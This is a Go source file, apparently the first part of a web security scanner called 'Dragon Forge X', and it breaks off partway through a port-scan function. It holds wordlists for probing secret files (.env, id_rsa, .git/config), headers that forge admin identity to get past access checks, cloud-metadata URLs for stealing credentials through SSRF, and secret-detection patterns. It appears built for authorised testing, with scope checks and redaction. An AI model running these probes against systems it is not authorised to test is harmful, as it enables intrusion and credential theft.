package main

import (
	"bufio"
	"context"
	"crypto/hmac"
	crand "crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"html"
	"io"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"
)

/* Dragon Forge X v4.0-go — Part 1: Core + Base Modules */

const Banner = "\n ____  ____  _____  _____  ____  ____  ____ \n(  _ \\\\ ___)(  _  )(  _  )( ___)( ___)(_  _)\n )(_) ))__)  )(_)(  )(_)(  )__)  )__)   )(  \n(____/(____)(_____)(_____)(____)(____) (__) \n\n        D R A G O N   F O R G E   X  v4.0\n"

var UA = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0",
	"Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Firefox/128.0",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1) Safari/604.1",
}

var DirWL = []string{"", "admin", "admin/", "login", "auth", "profile", "news", "api", "api/", "api/me", "api/profile", "api/collections", "api/users", "api/user", "api/config", "robots.txt", "sitemap.xml", ".env", ".env.local", ".git/config", ".git/HEAD", "backup.zip", "dump.sql", "db.sqlite", "config.json", "package.json", "server.js", "app.js", "console", "debug", "upload", "uploads/", "files/", "static/", "graphql", "graphiql", "swagger-ui/", "actuator", "actuator/env", "view", "view?file=../app.py"}

var SecretWL = []string{".env", ".env.backup", ".env.old", ".git/config", ".git/HEAD", "config.json", "config.yml", "settings.json", "secret.json", "secrets.json", "db.json", "users.json", "database.sqlite", "db.sqlite", "data.db", "backup.zip", "dump.sql", "server.js", "app.js", "package.json", "id_rsa", "id_rsa.pub", "authorized_keys", ".bash_history", ".htpasswd", "credentials.json", "private.key", "private.pem", "app.py", "main.py"}

var ParamWL = []string{"id", "user", "user_id", "userId", "username", "name", "role", "admin", "debug", "internal", "all", "limit", "page", "offset", "sort", "filter", "token", "session", "q", "search", "query", "file", "path", "url", "redirect", "callback", "cmd", "exec", "command", "action", "console", "shell", "host", "ip", "port", "proxy", "target", "key", "api_key", "auth", "password", "secret"}

var RedirectWL = []string{"redirect", "url", "next", "return", "r", "continue", "dest", "destination", "redir", "goto", "target"}

var SQLMarkers = []string{"sql syntax", "mysql", "mariadb", "sqlite", "postgresql", "ora-", "syntax error", "unterminated string", "unclosed quotation", "pg_query", "mssql", "sqlstate"}

var BypassHeaders = []map[string]string{
	{"X-Forwarded-For": "127.0.0.1"}, {"X-Real-IP": "127.0.0.1"},
	{"X-Forwarded-Host": "localhost"}, {"X-Original-URL": "/admin"},
	{"X-Rewrite-URL": "/admin"}, {"X-User": "admin"}, {"X-User-Id": "10"},
	{"X-Username": "admin"}, {"X-Role": "admin"}, {"X-Admin": "true"},
	{"X-Custom-Auth": "true"}, {"X-Internal-User": "true"}, {"X-Debug": "1"},
	{"X-Forwarded-For": "127.0.0.1, 127.0.0.1"},
}

var CorsOrigins = []string{"https://evil.example", "null", "http://localhost:3000", "file://"}

var WafSigs = map[string][]string{
	"ddosfilter": {"ddosfilter", "/_dfjs/", "ddos-guard"},
	"cloudflare": {"cf-ray", "__cf_bm", "cloudflare", "just a moment", "_cf_chl"},
	"ddos_guard": {"ddos-guard", "ddos_guard"},
	"qrator":     {"qrator"},
	"stormwall":  {"stormwall"},
	"akamai":     {"akamai"},
	"aws":        {"x-amzn-waf"},
	"sucuri":     {"x-sucuri-id"},
	"imperva":    {"incap_ses", "_incubate"},
	"modsec":     {"mod_security", "modsecurity"},
}

var WafBlock = map[int]bool{403: true, 406: true, 429: true, 503: true}

var JSKeys = map[string]string{
	"AWS":     "AKIA[0-9A-Z]{16}",
	"Google":  "AIza[0-9A-Za-z\\-_]{35}",
	"Slack":   "xox[baprs]-[0-9A-Za-z\\-]{10,}",
	"JWT":     "eyJ[A-Za-z0-9_-]{10,}\\.[A-Za-z0-9_-]{10,}\\.[A-Za-z0-9_-]{10,}",
	"GitHub":  "gh[pousr]_[A-Za-z0-9]{36}",
	"PrivKey": "-----BEGIN [A-Z ]*PRIVATE KEY-----",
	"Generic": "(?i)(secret|token|apikey|password)\\s*[:=]\\s*['\"][^'\"]{6,}['\"]",
}

var SensitivePat = map[string]string{
	"Email":   "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}",
	"IPv4":    "\\b(?:10\\.|172\\.(?:1[6-9]|2[0-9]|3[01])\\.|192\\.168\\.)\\d{1,3}\\.\\d{1,3}\\b",
	"JWT":     "eyJ[A-Za-z0-9_-]{10,}\\.[A-Za-z0-9_-]{10,}\\.[A-Za-z0-9_-]{10,}",
	"AWS":     "AKIA[0-9A-Z]{16}",
	"PrivKey": "-----BEGIN [A-Z ]*PRIVATE KEY-----",
	"GitHub":  "gh[pousr]_[A-Za-z0-9]{36}",
}

var DomSinks = []string{"innerHTML", "outerHTML", "document.write", "eval(", "location.href", "location.assign", "window.open", "onerror=", "onload="}

var CloudEPs = []struct {
	C string
	U string
	H map[string]string
}{
	{"AWS", "http://169.254.169.254/latest/meta-data/", nil},
	{"AWS", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", nil},
	{"GCP", "http://metadata.google.internal/computeMetadata/v1/", map[string]string{"Metadata-Flavor": "Google"}},
	{"Azure", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", map[string]string{"Metadata": "true"}},
	{"Alibaba", "http://100.100.100.200/latest/meta-data/", nil},
	{"Oracle", "http://169.254.169.254/opc/v2/instance/", map[string]string{"Authorization": "Bearer Oracle"}},
}

var PrivFields = []string{"isAdmin", "is_admin", "admin", "role", "roles", "permissions", "is_staff", "is_superuser", "active", "verified", "user_type", "access_level"}

var SevColors = map[string]string{"CRITICAL": "\x1b[1m\x1b[41m", "HIGH": "\x1b[1m\x1b[31m", "MEDIUM": "\x1b[1m\x1b[33m", "LOW": "\x1b[1m\x1b[34m", "INFO": "\x1b[0m\x1b[2m"}
var SevOrder = map[string]int{"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
var CVSSMap = map[string]string{"CRITICAL": "9.8", "HIGH": "7.5", "MEDIUM": "5.3", "LOW": "3.1", "INFO": "0.0"}

// Pre-compiled regexps (avoid MustCompile inside hot loops).
var (
	reHref        = regexp.MustCompile(`href=["']([^"']+)["']`)
	reSrc         = regexp.MustCompile(`src=["']([^"']+)["']`)
	reID          = regexp.MustCompile(`id="([^"]+)"`)
	reClass       = regexp.MustCompile(`class="([^"]+)"`)
	reName        = regexp.MustCompile(`name="([^"]+)"`)
	reJSVar       = regexp.MustCompile(`(?:var|const|let)\s+([a-zA-Z_$][a-zA-Z0-9_$]*)`)
	reAPIPath     = regexp.MustCompile(`["']/(api/[a-zA-Z0-9_\-/.]+)["']`)
	reDedupGen    = regexp.MustCompile(`:\s*\S+`)
	reURLInEv     = regexp.MustCompile(`https?://[^\s"'<>\]]+`)
	reSafeName    = regexp.MustCompile(`[^A-Za-z0-9._-]`)
	reJWTToken    = regexp.MustCompile(`eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}`)
	reAWSKey      = regexp.MustCompile(`AKIA[0-9A-Z]{16}`)
	rePrivateKey  = regexp.MustCompile(`(?s)-----BEGIN [A-Z ]*PRIVATE KEY-----.*?-----END [A-Z ]*PRIVATE KEY-----`)
	reBearerToken = regexp.MustCompile(`(?i)(bearer\s+)[A-Za-z0-9._~+/-]+`)
)

// AllMods — updated as we add modules
var AllMods = []string{
	"waf", "recon", "portscan", "scan", "app", "js", "dom", "param", "secret", "file",
	"cors", "header", "rate", "sqli", "idor", "xss", "csrf", "cache", "ssrf",
	"graphql", "bola", "wordlist", "cloud", "mass", "proto", "smuggling",
	"subdomain", "subtakeover", "openapi", "jwt", "csp", "wasm", "oauth", "deser",
	"ssti", "rce", "xxe",
	"dedup", "diff", "external",
}

// CMS / Framework fingerprints: path → technology name
var CMSFingerprints = map[string]string{
	"/wp-login.php": "WordPress", "/wp-admin/": "WordPress", "/wp-content/": "WordPress",
	"/_next/": "Next.js", "/_next/data/": "Next.js",
	"/actuator": "Spring Boot", "/actuator/health": "Spring Boot", "/actuator/info": "Spring Boot",
	"/docs": "FastAPI", "/redoc": "FastAPI",
	"/rails/info": "Ruby on Rails", "/rails/info/properties": "Ruby on Rails",
	"/elmah.axd": "ASP.NET", "/trace.axd": "ASP.NET",
}

var CMSHeaderSigs = map[string]map[string]string{
	"X-Powered-By": {"laravel": "Laravel", "express": "Express.js", "asp.net": "ASP.NET", "php": "PHP"},
	"X-Generator":  {"wordpress": "WordPress", "drupal": "Drupal", "joomla": "Joomla"},
	"Server":       {"nginx": "Nginx", "apache": "Apache", "gunicorn": "Gunicorn", "uvicorn": "Uvicorn", "kestrel": "Kestrel", "caddy": "Caddy"},
}

var CMSBodySigs = map[string]string{
	"wp-content":          "WordPress",
	"csrfmiddlewaretoken": "Django",
	"__next":              "Next.js",
	"__nuxt":              "Nuxt.js",
	"ng-version":          "Angular",
	"data-reactroot":      "React",
	"ember-view":          "Ember.js",
}

var ExtraWafSigs = map[string][]string{
	"barracuda": {"barra_counter_session"},
	"f5_bigip":  {"bigipserver", "f5-trafficshield"},
	"fortinet":  {"fortiwafsid", "fortigate"},
	"citrix":    {"ns_af", "citrix_ns_id"},
	"reblaze":   {"rbzid"},
	"wallarm":   {"wallarm"},
}

// FormData holds parsed HTML form data for automated testing.
type FormData struct {
	Action  string
	Method  string
	Fields  []FormField
	PageURL string
}

type FormField struct {
	Name  string
	Type  string
	Value string
}

// APIEndpoint holds a discovered API route for OpenAPI-driven scanning.
type APIEndpoint struct {
	Path   string
	Method string
	Params []string
	Source string // "openapi", "js", "crawl"
}

// headerSlice implements flag.Value for repeatable -H flags.
type headerSlice []string

func (h *headerSlice) String() string { return strings.Join(*h, ", ") }
func (h *headerSlice) Set(v string) error {
	*h = append(*h, v)
	return nil
}

// Pre-compiled regexps for form parsing.
var (
	reFormTag   = regexp.MustCompile(`(?is)<form\s[^>]*>.*?</form>`)
	reFormAttrs = regexp.MustCompile(`(?i)<form\s+([^>]*)>`)
	reInputTag  = regexp.MustCompile(`(?i)<(?:input|select|textarea)\s+([^>]*)>`)
	reAttr      = regexp.MustCompile(`(?i)(\w+)\s*=\s*["']([^"']*)["']`)
)

type Finding struct {
	ID       string `json:"id"`
	Module   string `json:"module"`
	Title    string `json:"title"`
	Severity string `json:"severity"`
	CVSS     string `json:"cvss"`
	Evidence string `json:"evidence"`
	PoC      string `json:"poc"`
	Ts       string `json:"ts"`
}

type CrawlPage struct {
	URL     string
	Status  int
	Text    string
	Headers http.Header
}

type Args struct {
	URL       string
	All       bool
	Modules   string
	Active    bool
	External  bool
	Out       string
	ResultDir string
	MaxPages  int
	Timeout   int
	Insecure  bool
	Username  string
	Password  string
	Threads   int
	Delay     float64
	RotateUA  bool
	Diff      string
	Headers   headerSlice
}

type Ctx struct {
	Target          string
	Host            string
	Base            string
	TargetScheme    string
	TargetPort      string
	TargetAuthority string
	ScopePath       string
	Scope           []string
	IsIP            bool
	Args            Args
	Client          *http.Client
	ExternalClient  *http.Client
	OutDir          string
	ResultDir       string
	LogDir          string
	LootDir         string
	PocDir          string
	Findings        []Finding
	Seen            map[string]bool
	Crawled         []CrawlPage
	JSBlobs         map[string]string
	JSEP            map[string]bool
	WAF             []string
	Delay           float64
	Timings         map[string]float64
	Forms           []FormData
	APIEndpoints    []APIEndpoint
	Subdomains      []string
	Technologies    []string
	CustomHeaders   map[string]string
	ctx             context.Context
	cancel          context.CancelFunc
	startTime       time.Time
	mu              sync.Mutex
}

func NewCtx(a Args) *Ctx {
	ctx, cancel := context.WithCancel(context.Background())
	ch := make(map[string]string)
	for _, h := range a.Headers {
		parts := strings.SplitN(h, ":", 2)
		if len(parts) == 2 {
			ch[strings.TrimSpace(parts[0])] = strings.TrimSpace(parts[1])
		}
	}
	return &Ctx{
		Args: a, Seen: make(map[string]bool), JSBlobs: make(map[string]string),
		JSEP: make(map[string]bool), Delay: a.Delay, Timings: make(map[string]float64),
		CustomHeaders: ch, ctx: ctx, cancel: cancel, startTime: time.Now(),
	}
}

func (c *Ctx) now() string { return time.Now().UTC().Format(time.RFC3339) }

func (c *Ctx) rand(n int) string {
	const ch = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, n)
	if _, err := crand.Read(b); err != nil {
		return fmt.Sprintf("%x", time.Now().UnixNano())[:min(n, 16)]
	}
	for i := range b {
		b[i] = ch[int(b[i])%len(ch)]
	}
	return string(b)
}

func (c *Ctx) userAgent() string {
	if c.Args.RotateUA && len(UA) > 0 {
		b := make([]byte, 1)
		if _, err := crand.Read(b); err == nil {
			return UA[int(b[0])%len(UA)]
		}
	}
	return UA[0]
}

func (c *Ctx) safeName(h string) string {
	return reSafeName.ReplaceAllString(h, "_")
}

func redactSensitive(s string) string {
	for _, pat := range SensitivePat {
		re := regexp.MustCompile(pat)
		s = re.ReplaceAllStringFunc(s, func(m string) string {
			if len(m) <= 6 {
				return "[REDACTED]"
			}
			return m[:3] + "…[REDACTED]"
		})
	}
	return s
}

func (c *Ctx) addF(mod, title, sev, ev, poc string) {
	ev = redactSensitive(ev)
	poc = redactSensitive(poc)
	sev = strings.ToUpper(sev)
	if _, ok := SevOrder[sev]; !ok {
		sev = "INFO"
	}
	k := mod + ":" + title + ":" + sev + ":" + trunc(ev, 140)
	c.mu.Lock()
	defer c.mu.Unlock()
	if c.Seen[k] {
		return
	}
	c.Seen[k] = true
	if poc == "" && strings.Contains(ev, "http") {
		m := reURLInEv.FindAllString(ev, -1)
		if len(m) > 0 {
			poc = fmt.Sprintf("curl -isk '%s'", m[0])
		}
	}
	f := Finding{fmt.Sprintf("F-%03d", len(c.Findings)+1), mod, title, sev, CVSSMap[sev], ev, poc, c.now()}
	c.Findings = append(c.Findings, f)
	if c.LogDir != "" {
		c.writeJSONL(filepath.Join(c.LogDir, "findings.jsonl"), f)
	}
	fmt.Printf("%s■ %s\x1b[0m %s\n", SevColors[sev], sev, title)
}

func (c *Ctx) initDirs() {
	d := c.safeName(c.TargetScheme + "_" + c.TargetAuthority)
	c.OutDir = filepath.Join(c.Args.Out, d)
	c.ResultDir = filepath.Join(c.OutDir, c.Args.ResultDir)
	c.LogDir = filepath.Join(c.ResultDir, "logs")
	c.LootDir = filepath.Join(c.ResultDir, "loot")
	c.PocDir = filepath.Join(c.ResultDir, "poc")
	for _, p := range []string{c.OutDir, c.ResultDir, c.LogDir, c.LootDir, c.PocDir} {
		_ = os.MkdirAll(p, 0700)
	}
}

func (c *Ctx) writeJSONL(p string, v interface{}) {
	f, err := os.OpenFile(p, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	if err != nil {
		return
	}
	defer f.Close()
	json.NewEncoder(f).Encode(v)
}

func (c *Ctx) saveTxt(p, t string) {
	if err := os.WriteFile(p, []byte(t), 0600); err != nil {
		fmt.Printf("[!] write %s failed: %v\n", p, err)
	}
}

func (c *Ctx) saveJSON(p string, v interface{}) {
	f, err := os.OpenFile(p, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0600)
	if err != nil {
		fmt.Printf("[!] create %s failed: %v\n", p, err)
		return
	}
	defer f.Close()
	e := json.NewEncoder(f)
	e.SetIndent("", "  ")
	if err := e.Encode(v); err != nil {
		fmt.Printf("[!] encode %s failed: %v\n", p, err)
	}
}

func (c *Ctx) setupClient() {
	t := &http.Transport{
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: c.Args.Insecure},
		MaxIdleConns:        20,
		MaxIdleConnsPerHost: 20,
		IdleConnTimeout:     30 * time.Second,
	}
	jar, err := cookiejar.New(nil)
	if err != nil {
		fmt.Printf("[!] cookie jar setup failed: %v\n", err)
	}
	noRedirect := func(r *http.Request, v []*http.Request) error {
		return http.ErrUseLastResponse
	}
	c.Client = &http.Client{
		Transport:     t,
		Timeout:       time.Duration(c.Args.Timeout) * time.Second,
		Jar:           jar,
		CheckRedirect: noRedirect,
	}
	// Discovery outside the explicitly authorized origin must never reuse
	// authenticated cookies or caller-supplied credentials.
	c.ExternalClient = &http.Client{
		Transport:     t,
		Timeout:       time.Duration(c.Args.Timeout) * time.Second,
		CheckRedirect: noRedirect,
	}
}

func (c *Ctx) cancelled() bool {
	select {
	case <-c.ctx.Done():
		return true
	default:
		return false
	}
}

const maxResponseBytes = 2 << 20

func effectivePort(u *url.URL) string {
	if port := u.Port(); port != "" {
		return port
	}
	if strings.EqualFold(u.Scheme, "https") {
		return "443"
	}
	return "80"
}

func (c *Ctx) isTargetURL(u *url.URL) bool {
	return u != nil && strings.EqualFold(u.Scheme, c.TargetScheme) &&
		strings.EqualFold(u.Hostname(), c.Host) && effectivePort(u) == c.TargetPort
}

func (c *Ctx) applyTargetCredentials(r *http.Request) {
	if !c.isTargetURL(r.URL) {
		return
	}
	if c.Args.Username != "" || c.Args.Password != "" {
		r.SetBasicAuth(c.Args.Username, c.Args.Password)
	}
	for k, v := range c.CustomHeaders {
		r.Header.Set(k, v)
	}
}

func (c *Ctx) request(method, path string, headers map[string]string, body string, ct string, follow, allowExternal bool) (*http.Response, string) {
	const maxRedirects = 10
	curMethod := method
	curPath := path
	curBody := body
	curCT := ct
	for attempt := 0; attempt <= maxRedirects; attempt++ {
		if c.cancelled() {
			return nil, ""
		}
		rawURL, err := url.Parse(strings.TrimSpace(curPath))
		if err != nil {
			return nil, ""
		}
		u := rawURL.String()
		if !rawURL.IsAbs() {
			u = strings.TrimRight(c.Base, "/") + "/" + strings.TrimLeft(curPath, "/")
			rawURL, err = url.Parse(u)
			if err != nil {
				return nil, ""
			}
		}
		if !strings.EqualFold(rawURL.Scheme, "http") && !strings.EqualFold(rawURL.Scheme, "https") {
			return nil, ""
		}
		if !allowExternal && !c.isTargetURL(rawURL) {
			return nil, ""
		}
		if c.Args.Delay > 0 {
			time.Sleep(time.Duration(c.Args.Delay * float64(time.Second)))
		}
		var br io.Reader
		if curBody != "" {
			br = strings.NewReader(curBody)
		}
		r, err := http.NewRequestWithContext(c.ctx, curMethod, rawURL.String(), br)
		if err != nil {
			return nil, ""
		}
		r.Header.Set("User-Agent", c.userAgent())
		if curCT != "" {
			r.Header.Set("Content-Type", curCT)
		}
		c.applyTargetCredentials(r)
		for k, v := range headers {
			r.Header.Set(k, v)
		}
		client := c.Client
		if !c.isTargetURL(rawURL) {
			client = c.ExternalClient
		}
		resp, err := client.Do(r)
		if err != nil {
			return nil, ""
		}
		rb, _ := io.ReadAll(io.LimitReader(resp.Body, maxResponseBytes+1))
		resp.Body.Close()
		if len(rb) > maxResponseBytes {
			rb = rb[:maxResponseBytes]
		}
		if follow && resp.StatusCode >= 300 && resp.StatusCode < 400 {
			loc := resp.Header.Get("Location")
			if loc != "" {
				if !strings.HasPrefix(loc, "http") {
					p, _ := url.Parse(u)
					loc = resolveRef(p, loc)
				}
				curMethod = "GET"
				curPath = loc
				curBody = ""
				curCT = ""
				continue
			}
		}
		return resp, string(rb)
	}
	return nil, ""
}

func (c *Ctx) req(method, path string, headers map[string]string, body string, ct string, follow bool) (*http.Response, string) {
	return c.request(method, path, headers, body, ct, follow, false)
}

// workerPool runs fn for each item in tasks using up to threads goroutines.
func workerPool[T any](tasks []T, threads int, fn func(T)) {
	if threads <= 0 {
		threads = 1
	}
	sem := make(chan struct{}, threads)
	var wg sync.WaitGroup
	for _, t := range tasks {
		wg.Add(1)
		go func(item T) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()
			fn(item)
		}(t)
	}
	wg.Wait()
}

func (c *Ctx) get(p string, h map[string]string) (*http.Response, string) {
	return c.req("GET", p, h, "", "", false)
}

func (c *Ctx) post(p string, h map[string]string, b, ct string) (*http.Response, string) {
	return c.req("POST", p, h, b, ct, false)
}

// externalGet is reserved for intentionally unauthenticated discovery such as
// CT lookups and subdomain liveness. It never sends the target session.
func (c *Ctx) externalGet(p string, h map[string]string) (*http.Response, string) {
	return c.request("GET", p, h, "", "", false, true)
}

func (c *Ctx) inScope(u string) bool {
	p, err := url.Parse(u)
	if err != nil || !c.isTargetURL(p) {
		return false
	}
	path := p.EscapedPath()
	if path == "" {
		path = "/"
	}
	return c.ScopePath == "/" || path == c.ScopePath || strings.HasPrefix(path, c.ScopePath+"/")
}

func (c *Ctx) baseDomain(h string) string {
	h = strings.ToLower(strings.Split(h, ":")[0])
	parts := strings.Split(h, ".")
	if len(parts) == 4 {
		v4 := true
		for _, p := range parts {
			if _, e := strconv.Atoi(p); e != nil {
				v4 = false
				break
			}
		}
		if v4 {
			c.IsIP = true
			return h
		}
	}
	// Compound TLDs where the last two labels are the public suffix.
	compoundTLDs := map[string]bool{
		"co.uk": true, "co.jp": true, "co.kr": true, "co.in": true,
		"co.nz": true, "co.za": true, "co.il": true, "co.id": true,
		"com.br": true, "com.au": true, "com.cn": true, "com.tw": true,
		"com.mx": true, "com.ar": true, "com.tr": true, "com.sg": true,
		"com.hk": true, "com.my": true, "com.ua": true, "com.co": true,
		"net.au": true, "org.uk": true, "org.au": true, "ac.uk": true,
	}
	if len(parts) >= 3 {
		suffix := strings.Join(parts[len(parts)-2:], ".")
		if compoundTLDs[suffix] {
			return strings.Join(parts[len(parts)-3:], ".")
		}
	}
	if len(parts) >= 2 {
		return strings.Join(parts[len(parts)-2:], ".")
	}
	return h
}

func (c *Ctx) isLocal() bool {
	h := strings.ToLower(c.Host)
	return h == "localhost" || h == "127.0.0.1" ||
		strings.HasPrefix(h, "10.") || strings.HasPrefix(h, "192.168.")
}

func (c *Ctx) selectedMods() []string {
	if c.Args.All {
		r := make([]string, len(AllMods))
		copy(r, AllMods)
		return r
	}
	var sel []string
	for _, m := range strings.Split(c.Args.Modules, ",") {
		m = strings.TrimSpace(strings.ToLower(m))
		for _, a := range AllMods {
			if a == m {
				sel = append(sel, m)
			}
		}
	}
	return sel
}

func (c *Ctx) phase(m string) {
	fmt.Printf("\n┌─[ ░▒▓ %s ▓▒░ ]────────────────────────────┐\n", strings.ToUpper(m))
}

func requireActive(c *Ctx, module, activity string) bool {
	if c.Args.Active {
		return true
	}
	c.addF(module, activity+" skipped (use --active)", "INFO", "", "")
	return false
}

func (c *Ctx) saveFull() {
	p := filepath.Join(c.ResultDir, "full_output.txt")
	f, err := os.OpenFile(p, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0600)
	if err != nil {
		fmt.Printf("[!] create %s failed: %v\n", p, err)
		return
	}
	defer f.Close()
	w := bufio.NewWriter(f)
	defer w.Flush()
	fmt.Fprintf(w, "%s\n  DRAGON FORGE X v4.0 — FULL DATA DUMP\n  Target: %s\n  Generated: %s\n%s\n\n",
		strings.Repeat("=", 80), c.Target, c.now(), strings.Repeat("=", 80))
	if c.LogDir != "" {
		if es, _ := os.ReadDir(c.LogDir); es != nil {
			for _, e := range es {
				if e.IsDir() {
					continue
				}
				fmt.Fprintf(w, "--- %s ---\n", strings.ToUpper(e.Name()))
				if d, _ := os.ReadFile(filepath.Join(c.LogDir, e.Name())); d != nil {
					w.Write(d)
				}
				fmt.Fprintf(w, "\n%s\n\n", strings.Repeat("=", 80))
			}
		}
	}
	fmt.Printf("[+] TXT: %s\n", p)
}

// === PROGRESS BAR ===
type prog struct {
	total, cur int
	start      time.Time
	mu         sync.Mutex
	done       bool
}

func newProg(n int) *prog { return &prog{total: n, start: time.Now()} }

func (p *prog) inc() {
	p.mu.Lock()
	defer p.mu.Unlock()
	p.cur++
	pct := 0.0
	if p.total > 0 {
		pct = float64(p.cur) / float64(p.total) * 100
	}
	f := int(pct / 5)
	if f > 20 {
		f = 20
	}
	if f < 0 {
		f = 0
	}
	elapsed := time.Since(p.start).Seconds()
	etaStr := ""
	if p.cur > 0 && p.cur < p.total && elapsed > 0.5 {
		speed := float64(p.cur) / elapsed
		rem := float64(p.total-p.cur) / speed
		if rem < 60 {
			etaStr = fmt.Sprintf(" ETA: %.0fs", rem)
		} else {
			etaStr = fmt.Sprintf(" ETA: %.1fm", rem/60)
		}
	}
	fmt.Printf("\r\x1b[32m[%s%s]\x1b[0m %d/%d (%.0f%%)%s", strings.Repeat("█", f), strings.Repeat("░", 20-f), p.cur, p.total, pct, etaStr)
	if p.cur >= p.total && !p.done {
		fmt.Println()
		p.done = true
	}
}

// ============================================================================
// BASE MODULES
// ============================================================================

func isBotChallengeOrBlock(b string, status int, headers http.Header) bool {
	bl := strings.ToLower(b)
	if strings.Contains(bl, "/_dfjs/") || strings.Contains(bl, "ddosfilter") ||
		strings.Contains(bl, "just a moment...") || (strings.Contains(bl, "cloudflare") && strings.Contains(bl, "turnstile")) ||
		strings.Contains(bl, "ddos-guard") || strings.Contains(bl, "security check to access") ||
		strings.Contains(bl, "attention required! | cloudflare") || strings.Contains(bl, "checking your browser") ||
		strings.Contains(bl, "enable javascript and cookies to continue") ||
		strings.Contains(bl, "challenge-running") || strings.Contains(bl, "cf-turnstile") {
		return true
	}
	if headers != nil {
		if server := strings.ToLower(headers.Get("Server")); strings.Contains(server, "ddosfilter") && strings.Contains(bl, "<script") {
			return true
		}
	}
	return false
}

func runWAF(c *Ctx) {
	c.phase("WAF")
	r, b := c.get("/", nil)
	if r == nil {
		c.addF("waf", "No response", "INFO", "", "")
		return
	}
	var det []string
	hl := make(map[string]string)
	for k, v := range r.Header {
		if len(v) > 0 {
			hl[strings.ToLower(k)] = v[0]
		}
	}
	ah := strings.ToLower(fmt.Sprintf("%v", hl))
	bl := strings.ToLower(b)
	for wn, sigs := range WafSigs {
		for _, s := range sigs {
			if strings.Contains(ah, s) || strings.Contains(bl, s) {
				det = append(det, wn)
				break
			}
		}
	}
	if isBotChallengeOrBlock(b, r.StatusCode, r.Header) && len(det) == 0 {
		det = append(det, "anti_bot_challenge")
	}
	if WafBlock[r.StatusCode] {
		det = append(det, "generic_block")
	}
	c.WAF = det
	if len(det) > 0 {
		c.addF("waf", "WAF / DDoS Protection: "+strings.Join(det, ", "), "INFO", fmt.Sprintf("%v", det), "")
	} else {
		c.addF("waf", "No WAF", "INFO", fmt.Sprintf("Status: %d", r.StatusCode), "")
	}
}

func runRecon(c *Ctx) {
	c.phase("RECON")
	r, b := c.get("/", nil)
	if r == nil {
		return
	}
	var techs []string
	seen := make(map[string]bool)
	addTech := func(t string) {
		if !seen[t] {
			seen[t] = true
			techs = append(techs, t)
		}
	}
	// Header-based fingerprinting
	if s := r.Header.Get("Server"); s != "" {
		c.addF("recon", "Server: "+s, "INFO", "Server: "+s, "")
		addTech(s)
	}
	if s := r.Header.Get("X-Powered-By"); s != "" {
		c.addF("recon", "X-Powered-By: "+s, "INFO", "X-Powered-By: "+s, "")
		addTech(s)
	}
	for hdr, sigs := range CMSHeaderSigs {
		hv := strings.ToLower(r.Header.Get(hdr))
		for sig, tech := range sigs {
			if strings.Contains(hv, sig) {
				addTech(tech)
			}
		}
	}
	// Body-based fingerprinting (skip if bot challenge page)
	if !isBotChallengeOrBlock(b, r.StatusCode, r.Header) {
		bl := strings.ToLower(b)
		for sig, tech := range CMSBodySigs {
			if strings.Contains(bl, sig) {
				addTech(tech)
			}
		}
		// Path-based CMS probing
		for path, tech := range CMSFingerprints {
			pr, pb := c.get(path, nil)
			if pr != nil && (pr.StatusCode == 200 || pr.StatusCode == 301 || pr.StatusCode == 302) {
				if !isBotChallengeOrBlock(pb, pr.StatusCode, pr.Header) && len(pb) != len(b) {
					addTech(tech)
				}
			}
		}
	}
	// Favicon hash fingerprinting
	fr, fb := c.get("/favicon.ico", nil)
	if fr != nil && fr.StatusCode == 200 && len(fb) > 0 && !isBotChallengeOrBlock(fb, fr.StatusCode, fr.Header) {
		h := fmt.Sprintf("%x", sha256.Sum256([]byte(fb)))[:16]
		c.addF("recon", "Favicon hash: "+h, "INFO", "SHA256 prefix: "+h, "")
	}
	// Expanded WAF detection
	ah := strings.ToLower(fmt.Sprintf("%v", r.Header))
	for wn, sigs := range ExtraWafSigs {
		for _, s := range sigs {
			if strings.Contains(ah, s) {
				c.WAF = append(c.WAF, wn)
				break
			}
		}
	}
	if len(techs) > 0 {
		c.mu.Lock()
		c.Technologies = techs
		c.mu.Unlock()
		c.addF("recon", fmt.Sprintf("Tech stack: %d technologies", len(techs)), "INFO",
			strings.Join(techs, ", "), "")
	}
}

var CommonTCPPorts = []struct {
	Port int
	Name string
}{
	{21, "FTP"}, {22, "SSH"}, {23, "Telnet"}, {25, "SMTP"},
	{53, "DNS"}, {80, "HTTP"}, {110, "POP3"}, {143, "IMAP"},
	{443, "HTTPS"}, {445, "SMB"}, {1433, "MSSQL"}, {1521, "Oracle"},
	{2049, "NFS"}, {3306, "MySQL"}, {3389, "RDP"}, {5432, "PostgreSQL"},
	{5900, "VNC"}, {6379, "Redis"}, {8000, "HTTP-Alt"}, {8080, "HTTP-Proxy"},
	{8443, "HTTPS-Alt"}, {8888, "HTTP-Alt"}, {9000, "PHP-FPM"},
	{9200, "Elasticsearch"}, {27017, "MongoDB"},
}

func runPortScan(c *Ctx) {
	c.phase("PORT SCAN")
	p := newProg(len(CommonTCPPorts))
	type openPort struct {
		port   int
		name   string
		banner string
	}
	var openPorts []openPort
	var mu sync.Mutex

	checkPort := func(tp struct {
		Port int
		Name string
	}) {
		defer p.inc()
		if c.cancelled() {
			return
		}
		addr := net.JoinHostPort(c.Host, strconv.Itoa(tp.Port))
		d := net.Dialer{Timeout: 1500 * time.Millisecond}
		conn, err := d.DialContext(c.ctx, "tcp", addr)
		if err != nil {
			return
		}
		defer conn.Close()
		banner := ""
		_ = conn.SetReadDeadline(time.Now().Add(600 * time.Millisecond))
